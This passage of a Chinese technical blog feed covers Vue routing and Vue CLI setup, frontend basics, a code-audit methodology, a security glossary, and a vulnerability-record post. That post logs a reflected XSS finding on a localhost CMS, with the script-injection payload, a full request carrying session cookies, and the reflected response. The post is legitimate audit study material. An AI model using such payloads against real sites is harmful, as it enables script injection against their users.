class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;路由名字&#x27;</span>,</span><br><span class="line">  <span class="attr">query</span>: &#123;</span><br><span class="line">    参数名<span class="number">1</span>: <span class="string">&#x27;参数值1&#x27;</span>,</span><br><span class="line">    参数名<span class="number">2</span>: <span class="string">&#x27;参数值2&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="name-命名路由跳转传参-动态路由传参"><a href="#name-命名路由跳转传参-动态路由传参" class="headerlink" title="name 命名路由跳转传参 (动态路由传参)"></a>name 命名路由跳转传参 (动态路由传参)</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;路由名字&#x27;</span>,</span><br><span class="line">  <span class="attr">params</span>: &#123;</span><br><span class="line">    参数名: <span class="string">&#x27;参数值&#x27;</span>,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h2><p>编程式导航，如何跳转传参？</p><p>1.path路径跳转</p><ul><li><p>query传参</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(<span class="string">&#x27;/路径?参数名1=参数值1&amp;参数2=参数值2&#x27;</span>)</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">  <span class="attr">path</span>: <span class="string">&#x27;/路径&#x27;</span>,</span><br><span class="line">  <span class="attr">query</span>: &#123;</span><br><span class="line">    参数名<span class="number">1</span>: <span class="string">&#x27;参数值1&#x27;</span>,</span><br><span class="line">    参数名<span class="number">2</span>: <span class="string">&#x27;参数值2&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>动态路由传参</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(<span class="string">&#x27;/路径/参数值&#x27;</span>)</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">  <span class="attr">path</span>: <span class="string">&#x27;/路径/参数值&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><p>2.name命名路由跳转</p><ul><li><p>query传参</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;路由名字&#x27;</span>,</span><br><span class="line">  <span class="attr">query</span>: &#123;</span><br><span class="line">    参数名<span class="number">1</span>: <span class="string">&#x27;参数值1&#x27;</span>,</span><br><span class="line">    参数名<span class="number">2</span>: <span class="string">&#x27;参数值2&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>动态路由传参 (需要配动态路由)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;路由名字&#x27;</span>,</span><br><span class="line">  <span class="attr">params</span>: &#123;</span><br><span class="line">    参数名: <span class="string">&#x27;参数值&#x27;</span>,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><h1 id="组件缓存-Keep-alive"><a href="#组件缓存-Keep-alive" class="headerlink" title="组件缓存 Keep - alive"></a>组件缓存 Keep - alive</h1><h2 id="1-keep-alive是什么"><a href="#1-keep-alive是什么" class="headerlink" title="1.keep-alive是什么"></a>1.keep-alive是什么</h2><p>keep-alive 是 vue 的内置组件，当它包裹动态组件时，会缓存不活动的组件实例，而不是销毁它们；</p><p>keep-alive 是一个抽象组件，它自身不会渲染成一个DOM元素，也不会出现在父组件链中；</p><h2 id="2-keep-alive优缺点"><a href="#2-keep-alive优缺点" class="headerlink" title="2.keep-alive优缺点"></a>2.keep-alive优缺点</h2><p>组件切换过程中，把切换出去的组件保留到内存中，防止重复渲染DOM；</p><p>减少加载时间及性能消耗，提高用户体验；</p><p><strong>问题：</strong></p><p>缓存了所有被切换的组件</p><h1 id="VueCli-自定义创建项目"><a href="#VueCli-自定义创建项目" class="headerlink" title="VueCli 自定义创建项目"></a>VueCli 自定义创建项目</h1><p>1.安装脚手架 (已安装)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i @vue/cli -g</span><br></pre></td></tr></table></figure><p>2.创建项目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vue create hm-exp-mobile</span><br></pre></td></tr></table></figure><ul><li>选项</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Vue</span> <span class="variable constant_">CLI</span> v5<span class="number">.0</span><span class="number">.8</span></span><br><span class="line">? <span class="title class_">Please</span> pick a <span class="attr">preset</span>:</span><br><span class="line">  <span class="title class_">Default</span> ([<span class="title class_">Vue</span> <span class="number">3</span>] babel, eslint)</span><br><span class="line">  <span class="title class_">Default</span> ([<span class="title class_">Vue</span> <span class="number">2</span>] babel, eslint)</span><br><span class="line">&gt; <span class="title class_">Manually</span> select features     选自定义</span><br></pre></td></tr></table></figure><ul><li>手动选择功能</li></ul><p><img src="/2023/12/28/Vue/1682941856172.png" alt="68294185617"></p><ul><li>选择vue的版本</li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">3.</span>x</span><br><span class="line">&gt; <span class="number">2.</span>x</span><br></pre></td></tr></table></figure><ul><li>是否使用history模式</li></ul><p><img src="/2023/12/28/Vue/1682941888453.png" alt="image-20201025150602129"></p><ul><li>选择css预处理</li></ul><p><img src="/2023/12/28/Vue/1682941900018.png" alt="image-20220629175133593"></p><ul><li>选择eslint的风格 （eslint 代码规范的检验工具，检验代码是否符合规范）</li><li>比如：const age &#x3D; 18;   &#x3D;&gt;  报错！多加了分号！后面有工具，一保存，全部格式化成最规范的样子</li></ul><p><img src="/2023/12/28/Vue/1682941918562.png" alt="68294191856"></p><ul><li>选择校验的时机 （直接回车）</li></ul><p><img src="/2023/12/28/Vue/1682941935794.png" alt="68294193579"></p><ul><li>选择配置文件的生成方式 （直接回车）</li></ul><p><img src="/2023/12/28/Vue/1682941947985.png" alt="68294194798"></p><ul><li>是否保存预设，下次直接使用？  &#x3D;&gt;   不保存，输入 N</li></ul><p><img src="/2023/12/28/Vue/1682941961551.png" alt="68294196155"></p><ul><li>等待安装，项目初始化完成</li></ul><p><img src="/2023/12/28/Vue/1682941974763.png" alt="68294197476"></p><ul><li>启动项目</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run serve</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;hr&gt;
&lt;h1 id=&quot;差值表达式&quot;&gt;&lt;a href=&quot;#差值表达式&quot; class=&quot;headerlink&quot; title=&quot;差值表达式&quot;&gt;&lt;/a&gt;差值表达式&lt;/h1&gt;&lt;p&gt;差值表达式是一种Vue的模板语法；&lt;/p&gt;
&lt;p&gt;差值表达式不具备解析标签的能力；&lt;/p&gt;
&lt;figure</summary>
      
    
    
    
    <category term="开发" scheme="https://erickinyae.github.io/categories/%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="前端" scheme="https://erickinyae.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
    <category term="框架" scheme="https://erickinyae.github.io/tags/%E6%A1%86%E6%9E%B6/"/>
    
  </entry>
  
  <entry>
    <title>前端基础</title>
    <link href="https://erickinyae.github.io/2023/12/20/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/"/>
    <id>https://erickinyae.github.io/2023/12/20/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/</id>
    <published>2023-12-20T06:40:01.000Z</published>
    <updated>2024-03-06T10:08:04.312Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前端基础"><a href="#前端基础" class="headerlink" title="前端基础"></a>前端基础</h1><h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><h3 id="存放位置"><a href="#存放位置" class="headerlink" title="存放位置"></a>存放位置</h3><p>项目的依赖等信息都放在前端根目录下的：package.json文件中；</p><p><img src="/2023/12/20/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/image-20231220144138085.png" alt="image-20231220144138085"></p><p><img src="/2023/12/20/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/image-20231220144156242.png" alt="image-20231220144156242"></p><h3 id="依赖下载"><a href="#依赖下载" class="headerlink" title="依赖下载"></a>依赖下载</h3><p>在根目录中，在终端执行npm install，即可将依赖拉下来。</p><p><img src="/2023/12/20/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/image-20231220144300074.png" alt="image-20231220144300074"></p><h2 id="项目启动命令"><a href="#项目启动命令" class="headerlink" title="项目启动命令"></a>项目启动命令</h2><p>在package.json中查看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">  <span class="string">&quot;dev&quot;</span>: <span class="string">&quot;vue-cli-service serve&quot;</span>,</span><br><span class="line">  <span class="string">&quot;build:prod&quot;</span>: <span class="string">&quot;vue-cli-service build&quot;</span>,</span><br><span class="line">  <span class="string">&quot;build:stage&quot;</span>: <span class="string">&quot;vue-cli-service build --mode staging&quot;</span>,</span><br><span class="line">  <span class="string">&quot;preview&quot;</span>: <span class="string">&quot;node build/index.js --preview&quot;</span>,</span><br><span class="line">  <span class="string">&quot;svgo&quot;</span>: <span class="string">&quot;svgo -f src/icons/svg --config=src/icons/svgo.yml&quot;</span>,</span><br><span class="line">  <span class="string">&quot;lint&quot;</span>: <span class="string">&quot;eslint --ext .js,.vue src&quot;</span>,</span><br><span class="line">  <span class="string">&quot;test:unit&quot;</span>: <span class="string">&quot;jest --clearCache &amp;&amp; vue-cli-service test:unit&quot;</span>,</span><br><span class="line">  <span class="string">&quot;test:ci&quot;</span>: <span class="string">&quot;npm run lint &amp;&amp; npm run test:unit&quot;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>看到第一行，dev关键词对应了vue-cli-service serve，即可以通过 dev start 启动前端项目。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run dev</span><br></pre></td></tr></table></figure><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p><img src="/2023/12/20/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/image-20231220145346280.png" alt="image-20231220145346280"></p><h2 id="解决跨域问题"><a href="#解决跨域问题" class="headerlink" title="解决跨域问题"></a>解决跨域问题</h2><p><img src="/2023/12/20/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/image-20231222151934712.png" alt="image-20231222151934712"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前端基础&quot;&gt;&lt;a href=&quot;#前端基础&quot; class=&quot;headerlink&quot; title=&quot;前端基础&quot;&gt;&lt;/a&gt;前端基础&lt;/h1&gt;&lt;h2 id=&quot;依赖&quot;&gt;&lt;a href=&quot;#依赖&quot; class=&quot;headerlink&quot; title=&quot;依赖&quot;&gt;&lt;/a&gt;依赖&lt;/h</summary>
      
    
    
    
    <category term="开发" scheme="https://erickinyae.github.io/categories/%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="前端" scheme="https://erickinyae.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>代码审计方法论</title>
    <link href="https://erickinyae.github.io/2023/12/08/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%96%B9%E6%B3%95%E8%AE%BA/"/>
    <id>https://erickinyae.github.io/2023/12/08/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%96%B9%E6%B3%95%E8%AE%BA/</id>
    <published>2023-12-08T08:10:22.000Z</published>
    <updated>2023-12-08T08:10:50.180Z</updated>
    
    <content type="html"><![CDATA[<p>黑盒验证 -&gt; 白盒代码级确认 -&gt; 代码修复建议</p><h2 id="第一步-目标确认、理解功能与架构"><a href="#第一步-目标确认、理解功能与架构" class="headerlink" title="第一步 目标确认、理解功能与架构"></a>第一步 目标确认、理解功能与架构</h2><ol><li>确定要审计的应用程序或系统的范围，包括具体的功能、模块或代码库。具体而言，需要收集与应用程序相关的所有文档，包括设计文档、架构文档、数据库模型等。同时收集应用程序的源代码、依赖项和配置文件；</li><li>通过收集到的信息清晰地理解到应用中具体的一些功能和所使用的架构信息，并在此基础上，标记出容易出现漏洞的部分（如写库操作、高级权限操作等）；</li></ol><h2 id="第二步-动态黑盒分析"><a href="#第二步-动态黑盒分析" class="headerlink" title="第二步  动态黑盒分析"></a>第二步  动态黑盒分析</h2><ol><li><p>配置测试环境：配置一个用于动态测试的安全环境，确保能够模拟真实攻击场景；</p></li><li><p>自动扫描：使用动态代码分析工具，包括：xray、Burp Suite等，对应用程序进行主动扫描，寻找运行时漏洞，这个部分主要是为了发现常见的OWASP Top10基本漏洞；</p></li><li><p><strong>主动测试：通过手动渗透测试，模拟攻击者行为，尝试绕过安全控制并发现更深层次的漏洞；</strong></p><blockquote><p>主要针对的有：</p><ul><li>身份验证绕过：缺失对用户身份验证的检查或绕过密码验证；</li><li>访问控制：缺失访问控制检查，导致未授权用户或角色访问敏感数据或功能；</li><li>会话管理：错误的会话处理，包括会话劫持、会话固定、未正确终止会话等，可能会导致未授权访问；</li><li>数据验证不足：对输入数据进行不足的验证，可能导致注入攻击、越权访问等问题；</li><li>业务逻辑：与应用程序的业务逻辑相关的错误，可能导致不正确的数据处理或操作；</li><li>不正确的错误处理：错误处理机制不当，可能会泄露敏感信息，或为攻击者提供有关系统的信息；</li><li>文件上传：不正确地处理用户上传的文件，可能导致恶意文件上传和执行；</li><li>多步骤操作原子性问题：缺乏适当的事务处理，导致在多步骤操作中的某些步骤失败时，系统处于不一致状态；</li><li>竞态条件：在多线程或并发操作时，由于时序不当而引发的问题，可能导致未授权访问或数据不一致；</li><li>缺乏日志监控：缺乏对关键事件和日常的日志记录和监控，使得对安全事件的检测和响应受到影响。</li></ul></blockquote></li></ol><h2 id="第三步-白盒分析"><a href="#第三步-白盒分析" class="headerlink" title="第三步 白盒分析"></a>第三步 白盒分析</h2><ol><li><p>代码分析：仔细阅读源代码，理解应用程序的工作原理、数据流和业务逻辑；</p></li><li><p>使用静态代码分析工具，尝试找到代码中存在的问题，黑盒测试找到的漏洞，需要在白盒中进行定位并找到修复方法，确定是方法使用不当、还是鉴权逻辑错误、还是第三方包漏洞等；</p><blockquote><p>主要针对的有：</p><p>数据验证：验证应用程序对输入数据的处理方式，确保实施了正确的输入验证和过滤，以防止注入攻击；</p><p>认证和授权：审查应用程序中的身份验证和授权机制，确认它们是否安全可靠。<strong>检查密码存储、会话管理和访问控制</strong>；</p><p>敏感信息：检查应用程序处理敏感信息的方式，确保数据在传输和存储时都得到适当的加密和保护（密码）；</p><p>异常处理：审查应用程序的异常处理机制和日志记录功能，确保它们不会泄漏敏感信息（SQL报错不要直接返回等），并能够帮助检测和响应安全事件；</p></blockquote></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;黑盒验证 -&amp;gt; 白盒代码级确认 -&amp;gt; 代码修复建议&lt;/p&gt;
&lt;h2 id=&quot;第一步-目标确认、理解功能与架构&quot;&gt;&lt;a href=&quot;#第一步-目标确认、理解功能与架构&quot; class=&quot;headerlink&quot; title=&quot;第一步 目标确认、理解功能与架构&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="安全" scheme="https://erickinyae.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="代码审计" scheme="https://erickinyae.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计-漏洞记录</title>
    <link href="https://erickinyae.github.io/2023/12/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/"/>
    <id>https://erickinyae.github.io/2023/12/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/</id>
    <published>2023-12-06T05:56:28.000Z</published>
    <updated>2024-03-06T10:07:44.234Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><table><thead><tr><th>URL</th><th><a href="http://localhost:8888/system/cms/content/page?categoryId=">http://localhost:8888/system/cms/content/page?categoryId=</a></th></tr></thead><tbody><tr><td>ParamPosition</td><td><code>body</code></td></tr><tr><td>ParamKey</td><td><code>title</code></td></tr><tr><td>Payload</td><td><code>&quot;&gt;&lt;sCrIpT&gt;alert(1)&lt;/ScRiPt&gt;</code></td></tr><tr><td>Request1</td><td><code>POST /system/cms/content/page?categoryId= HTTP/1.1 Host: localhost:8888 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Content-Length: 118 Accept: text/html, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Cookie: vue_admin_template_token=admin-token; sidebarStatus=1; remember-me=YWRtaW46MTcwMjg4MzgxNDczNjo5ZjkwYmVhZTJhYjZiNjQyMzdhODNkZDhkMTRjNDJjZA; XSRF-TOKEN=7846bad7-ebe4-48a8-8cfb-3d72a7ab1564; cms_token=226553f96fb74a328f9798f1424850fe; dreamer-cms-s=c1544459-e4a0-4ea3-99c5-0ddebf2cae66; pb-cms-qq=; pb-cms-email=956968575@qq.com; JSESSIONID=F5F5CB00146F24022BB0EDA921A43D40; pageno_cookie=1; SHIRO_SESSION_ID=69dc1ad1-a73c-458c-87a0-531cf132c0f1; SESSION=ef82c6e0-dade-404a-8183-85c3b67dc7c7; bjui_theme=blue; Idea-fa2b9155=227d5999-324b-42f9-af39-22bf2f71aa49 Origin: http://localhost:8888 Referer: http://localhost:8888/system Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin X-Requested-With: XMLHttpRequest Accept-Encoding: gzip orderDirection=&amp;orderField=&amp;pageCurrent=1&amp;pageSize=30&amp;status=&amp;title=%22%3E%3CsCrIpT%3Eywrwavrxad%3C%2FsCrIpT%3E&amp;total=</code>Copy</td></tr><tr><td>Response1</td><td>&#96;HTTP&#x2F;1.1 200  Content-Language: zh-CN Content-Type: text&#x2F;html;charset&#x3D;UTF-8 Date: Wed, 06 Dec 2023 02:58:02 GMT <div class="bjui-pageHeader">    <form id="pagerForm" data-toggle="ajaxsearch" action="/system/cms/content/page?categoryId=" method="post">        <input type="hidden" name="pageSize" value="30">        <input type="hidden" name="pageCurrent" value="0">        <input type="hidden" name="orderField" value>        <input type="hidden" name="orderDirection" value>        <div class="bjui-searchBar">            <label>状态:</label>            <select name="status" data-toggle="selectpicker">                <option value selected>所有</option>                <option value="-1"> 删除</option>                <option value="0"> 草稿</option>                <option value="1"> 发布 </option>            </select>             <label>标题：</label><input type="text" value><sCrIpT>ywrwavrxad</sCrIpT>“ name&#x3D;”title” class&#x3D;”form-control” size&#x3D;”15”&gt;             <button type="submit" class="btn-default" data-icon="search">查询</button>             <a class="btn btn-orange" href="javascript:;" data-toggle="reloadsearch" data-clear-query="true" data-icon="undo">刷新全部</a>                         <div class="pull-right">                &lt;!–&lt;button type&#x3D;”button” class&#x3D;”btn-blue” data-url&#x3D;”ajaxDone2.html?id&#x3D;</div></div></form></div></td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;hr&gt;
&lt;h1 id=&quot;XSS&quot;&gt;&lt;a href=&quot;#XSS&quot; class=&quot;headerlink&quot; title=&quot;XSS&quot;&gt;&lt;/a&gt;XSS&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;URL&lt;/th&gt;
&lt;th&gt;&lt;a href=&quot;http://localhost:</summary>
      
    
    
    
    <category term="安全" scheme="https://erickinyae.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="代码审计" scheme="https://erickinyae.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计_逻辑漏洞</title>
    <link href="https://erickinyae.github.io/2023/12/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    <id>https://erickinyae.github.io/2023/12/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-12-05T08:08:23.000Z</published>
    <updated>2024-03-06T10:07:40.157Z</updated>
    
    
    
    
    <category term="安全" scheme="https://erickinyae.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="代码审计" scheme="https://erickinyae.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>OWASP代码审计指南</title>
    <link href="https://erickinyae.github.io/2023/11/30/OWASP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%8C%87%E5%8D%97/"/>
    <id>https://erickinyae.github.io/2023/11/30/OWASP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%8C%87%E5%8D%97/</id>
    <published>2023-11-30T07:53:45.000Z</published>
    <updated>2024-03-06T09:56:11.068Z</updated>
    
    
    
    
    <category term="安全" scheme="https://erickinyae.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="代码审计" scheme="https://erickinyae.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>词汇扫盲</title>
    <link href="https://erickinyae.github.io/2023/11/30/%E8%AF%8D%E6%B1%87%E6%89%AB%E7%9B%B2/"/>
    <id>https://erickinyae.github.io/2023/11/30/%E8%AF%8D%E6%B1%87%E6%89%AB%E7%9B%B2/</id>
    <published>2023-11-30T07:24:20.000Z</published>
    <updated>2024-03-06T10:07:11.070Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="SDLC"><a href="#SDLC" class="headerlink" title="SDLC"></a>SDLC</h1><p>SDLC代表软件开发生命周期（Software Development Life  Cycle）。它是一种用于设计、开发、测试和维护软件系统的过程或一组过程。SDLC的目的是产生符合或超出客户期望的高质量软件，在预定的时间和成本估算内完成，并在当前和计划的信息技术基础设施中有效且高效地运行。</p><p>SDLC的典型阶段包括：</p><ol><li><strong>规划：</strong> 在这个阶段，定义项目目标、范围、约束、风险和资源。创建项目计划，概述时间表、任务和责任。</li><li><strong>可行性研究：</strong> 进行可行性研究，评估所提系统的技术、运营和经济可行性。这有助于决定是否继续开发。</li><li><strong>系统设计：</strong> 系统设计阶段涉及为软件系统创建蓝图。包括高层和低层设计，定义架构、数据结构、接口和其他系统组件。</li><li><strong>实施（编码）：</strong> 这是实际编写软件代码的阶段。开发人员按照设计规范创建软件产品。</li><li><strong>测试：</strong> 对软件进行测试，以确保其满足指定的要求。测试可以包括单元测试、集成测试、系统测试和验收测试。</li><li><strong>部署（实施）：</strong> 将软件部署到生产环境。这可能涉及数据迁移、用户培训以及其他活动，使软件准备好投入使用。</li><li><strong>维护和支持：</strong> 部署后，软件进入维护阶段。这包括修复任何缺陷、进行增强和提供持续支持。</li><li><strong>评估：</strong> 这个阶段涉及在实际环境中评估软件的性能。收集用户和其他利益相关方的反馈，以确定改进的领域。</li></ol><p>这些阶段可以根据特定的开发方法进行调整或迭代。常见的开发方法包括瀑布模型、敏捷开发、Scrum等。每种方法都有自己的组织和执行SDLC阶段的方式。</p><h1 id="CICD"><a href="#CICD" class="headerlink" title="CICD"></a>CICD</h1><p>CICD（Continuous Integration and Continuous Delivery）是一种软件开发实践，旨在通过自动化软件发布过程，实现更频繁、更可靠的软件交付。这个流程主要分为两个主要部分：持续集成（Continuous Integration，CI）和持续交付（Continuous Delivery，CD）。</p><ol><li><strong>持续集成（CI）:</strong><ul><li><strong>代码提交：</strong> 开发者将代码提交到版本控制系统（如Git）中。</li><li><strong>自动化构建：</strong> 持续集成服务器会监测版本控制系统，一旦发现有新的代码提交，就会自动拉取代码并进行构建。构建过程包括编译代码、运行单元测试等。</li><li><strong>单元测试：</strong> 在构建过程中运行自动化的单元测试，以确保新的代码没有破坏现有功能。</li><li><strong>报告生成：</strong> 生成测试报告，显示测试的覆盖率和结果。</li></ul></li><li><strong>持续交付（CD）:</strong><ul><li><strong>自动化部署：</strong> 如果代码通过了持续集成阶段，它可以自动部署到一个预生产环境。这个环境模拟生产环境，但不对真实用户提供服务。</li><li><strong>集成测试：</strong> 在预产环境中运行更全面的集成测试，以确保不同组件之间的协作正常。</li><li><strong>用户验收测试（UAT）：</strong> 有时候，会将应用部署到一个模拟真实用户环境的用户验收测试环境。</li><li><strong>自动化发布：</strong> 如果所有测试通过，代码可以自动发布到生产环境，使新功能、改进或修复可用于真实用户。</li></ul></li></ol><p>这种流程的实施通常涉及使用各种工具和技术，如持续集成服务器（例如Jenkins、Travis CI）、自动化测试工具、容器化技术（例如Docker）、配置管理工具（例如Ansible）等。</p><h1 id="DNS劫持"><a href="#DNS劫持" class="headerlink" title="DNS劫持"></a>DNS劫持</h1><p>DNS劫持是一种网络攻击，旨在篡改目标用户计算机或网络设备的DNS（Domain Name  System）解析结果。DNS解析是将域名（如example.com）转换为IP地址（如192.0.2.1）的过程。通过劫持DNS，攻击者可以将用户尝试访问的域名重定向到恶意站点或伪装成合法站点的虚假网站，从而实施钓鱼攻击、恶意软件传播或信息窃取等活动。</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><ol><li>修改用户计算机或路由器上的DNS设置，将其指向恶意DNS服务器。</li><li>在网络层面篡改DNS查询响应，使用户计算机接收到虚假的DNS解析结果。</li><li>在ISP（Internet Service Provider，互联网服务提供商）或公共网络上进行中间人攻击，拦截并篡改DNS查询流量。</li></ol><h2 id="防止DNS劫持措施"><a href="#防止DNS劫持措施" class="headerlink" title="防止DNS劫持措施"></a>防止DNS劫持措施</h2><ul><li>使用受信任的DNS服务提供商，如Google的8.8.8.8和8.8.4.4或Cloudflare的1.1.1.1。</li><li>定期检查和更新路由器和计算机上的DNS设置，确保其未被恶意更改。</li><li>使用加密的DNS协议，如DNS over HTTPS（DoH）或DNS over TLS（DoT），以提高安全性。</li><li>定期检查网络流量，寻找异常活动或流量重定向迹象，并采取相应的防御措施。</li></ul><h2 id="DNS记录类型"><a href="#DNS记录类型" class="headerlink" title="DNS记录类型"></a>DNS记录类型</h2><table><thead><tr><th>类型</th><th>意义</th><th>示例</th></tr></thead><tbody><tr><td>A记录（Address Record）</td><td>将域名解析为IPv4地址</td><td>将example.com解析为192.0.2.1</td></tr><tr><td>AAAA记录</td><td>将域名解析为IPv6地址</td><td>将example.com解析为2001:0db8:85a3:0000:0000:8a2e:0370:7334</td></tr><tr><td>CNAME记录（Canonical Name）</td><td>创建一个域名的别名，将一个域名指向另一个域名</td><td>将<a href="http://www.example.com指向example.com/">www.example.com指向example.com</a></td></tr><tr><td>MX记录（Mail 